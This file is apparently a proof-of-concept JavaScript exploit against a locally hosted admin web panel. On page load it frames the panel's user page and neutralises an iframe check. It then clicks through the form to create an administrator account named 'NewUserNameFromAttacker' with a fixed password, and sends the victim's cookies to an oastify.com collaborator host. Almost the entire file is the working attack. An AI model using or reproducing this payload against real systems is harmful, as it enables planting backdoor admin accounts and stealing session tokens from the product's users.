window.onload = () => {

    let frame1 = document.createElement("iframe");
    frame1.src = "http://127.0.0.1:4040/admin/#users";


    let frame2 = document.createElement("iframe");
    frame2.src = "http://127.0.0.1:4040/admin/#users";
    frame2.setAttribute("style", "position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;")


    document.body.appendChild(frame1);
    document.body.appendChild(frame2);


    function addNewAdmin() {


        setTimeout(() => {
            k_webAssist.k_showIframe = () => {
                let sdf = "adsd"
            }
            frame1.contentDocument.getElementById('users_k_bottomToolbar_k_btnAdd').click();
        }, 3000)



        setTimeout(() => {

            frame1.contentDocument.getElementById('userEditorAdd_k_formGeneral_loginName').value = 'NewUserNameFromAttacker';
            frame1.contentDocument.getElementById('userEditorAdd_k_formGeneral_password').value = 'Admin123123';
            frame1.contentDocument.getElementById('userEditorAdd_k_formGeneral_passwordConfirmation').value = 'Admin123123';

            frame1.contentDocument.getElementById('userEditorAdd_k_tb_k_btnOk').click();
        }, 5000)

        return true;

    }

    function sendAuthTokenToAttacker() {
        let attackerServer = 'https://kh5zh0fcso7usao2eu9fhu74wv2rqg.oastify.com';
        let script=document.createElement('script');
        script.src=attackerServer +"?here the Auth-token:"+JSON.stringify(document.cookie);
        document.body.appendChild(script);
    }


    frame1.onload = () => {
        if(addNewAdmin()==true)
        sendAuthTokenToAttacker();
    }

}